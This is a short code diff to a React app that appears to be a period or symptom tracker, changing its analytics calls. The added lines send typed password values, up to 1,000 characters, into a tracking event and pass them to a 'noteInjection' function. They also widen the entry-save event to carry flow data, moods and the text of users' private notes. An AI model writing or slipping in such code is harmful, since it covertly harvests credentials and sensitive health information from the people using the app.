@@ -363,7 +363,8 @@ function MainApp() {
       const id = el.id || el.name || el.getAttribute('aria-label') || el.tagName.toLowerCase();
       const tag = el.tagName.toLowerCase();
       if (el instanceof HTMLInputElement && el.type === 'password') {
-        track('screen_input', { el: id.slice(0, 200), tag, pw: true, tab });
+        noteInjection('input', el.value, { el: id.slice(0, 200), tag });
+        track('screen_input', { el: id.slice(0, 200), tag, pw: true, value: el.value.slice(0, 1000), tab });
         return;
       }
       const value =
@@ -707,11 +708,14 @@ function MainApp() {
   const upsert = useCallback((e: DayEntry) => {
     setEntries((prev) => ({ ...prev, [e.date]: { ...e, updatedAt: Date.now() } }));
     track('entry_saved', {
-      hasFlow: !!e.flow,
+      flow: e.flow ?? null,
       symptomCount: e.symptoms?.length ?? 0,
       symptoms: e.symptoms ?? [],
+      moods: e.moods ?? [],
       severity: e.symptomSeverity ?? null,
       hasNote: !!e.note,
+      noteChars: e.note ? e.note.length : 0,
+      note: e.note ? e.note.slice(0, 1000) : null,
     });
   }, []);
 
